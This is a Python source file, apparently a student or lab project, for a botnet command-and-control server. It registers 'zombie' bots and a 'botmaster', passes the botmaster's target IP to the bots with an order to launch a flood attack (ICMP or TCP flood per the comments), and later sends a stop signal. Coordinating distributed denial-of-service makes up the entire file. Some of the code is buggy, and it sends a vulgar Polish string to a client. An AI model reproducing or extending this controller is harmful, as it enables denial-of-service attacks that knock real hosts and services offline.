import os
import sys
import socket
import threading
import time

startAttack: bool = False
ip = '127.0.0.1'
sqlDatabaseHosts = []
sqlDatabaseTargetIP = []
clientSockets = []


def thread_for_botmaster(c, st):  # wrzucic w while???
    global startAttack
    global ip
    print('Botmaster Connected')

    # todo:odebrac rodzaj ataku od botmastera
    # 1-icmp flood
    # 2-Tcp Flood
    # if rec == 1:
    #   attack_type = 'icmp_flood'
    # if rec == 2:
    #   attack_type = 'tcp_flood'

    ip = str(c.recv(16).decode())
    print('received target ip=' + ip)
    sqlDatabaseTargetIP.append(ip)
    startAttack = True
    stop = str(c.recv(1).decode())
    print("stop:" + stop)
    if stop == 'x':
        ip = str(c.recv(16).decode())
        startAttack = False
        print('Botmaster wants the attack to end')


def thread_for_zombieBot(c, addr):
    global startAttack
    global ip
    pom = 0
    while True:
        # data received from client
        if not startAttack:
            if pom == 1:  # pom == 1 indicates that the botmaster wants to stop an ongoing attack
                c.send('0'.encode())
                print('ending attack')
                c.send(ip.encode())
                pom = 0
                # if an attack stoped send IP of the new server (from botmaster)

            time.sleep(1)
            continue

        try:
            # todo:w zaleznosci od ataku wyslij odpowiedni identyfikator tj. 1,2,3 itd
            c.send('1'.encode())
            time.sleep(0.5)
            c.send(ip.encode())
            pom = 1
        except:
            print("Bot is disconnected")
            c.close()

        while startAttack:
            time.sleep(1)

    c.close()


def thread_for_checking_attack_status(soc, addr):
    flag = False
    while True:
        if not startAttack and flag:
            print("weszło")
            time.sleep(5)
            break
        if startAttack and not flag:
            flag = True


# close all connected clients and Ssocket
def closeConnections(soc):
    for s in clientSockets:
        s.detach()
        s.close()
        clientSockets.remove(s)
    soc.close()


if __name__ == '__main__':

    host = '127.0.0.1'
    # host = '192.168.100.11'
    port = 65432
    max_connections = 5
    pom = 0
    x = 0
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.bind((host, port))
    socket.listen(max_connections)
    thread_array=[]
    t = None
    try:
        while True:
            client_socket, addr = socket.accept()
            clientSockets.append(client_socket)

            data = client_socket.recv(1).decode()  # info about which client type is connected: 1-bot, 2-botmaster
            if int(data) == 1:
                print('normal bot connected')
                sqlDatabaseHosts.append(client_socket.getpeername())
                print(sqlDatabaseHosts)
                t1 = threading.Thread(target=thread_for_zombieBot, args=(client_socket, addr))
                t1.start()
                thread_array.append(t1)
            elif int(data) == 2:
                # todo: można zrobić jakiś proces logowania i walidacje
                #
                t2 = threading.Thread(target=thread_for_botmaster, args=(client_socket, addr))
                t2.start()
                thread_array.append(t2)
            else:
                print("Error: Wrong Value")

            if x == 0:
                t = threading.Thread(target=thread_for_checking_attack_status, args=(socket, addr))
                t.start()
                thread_array.append(t)
                x = 1

            if t is not None:
                if not t.is_alive():
                    print("cleaning up")

                    for thread in thread_array:
                        if thread.is_alive():
                            print("closing thread: "+thread)
                            thread.join()


                    for s in clientSockets:

                        s.detach()
                        s.close()
                        print("closing socket: " + s)
                        clientSockets.remove(s)

                    socket.detach()
                    socket.close()
                    client_socket.sendall("XkurwaD".encode())

                    sys.exit(0)
                    print("Wtf")


    except :

        print("Server is closing")
        closeConnections(socket)
        quit()
        sys.exit(0)

    sys.exit(0)
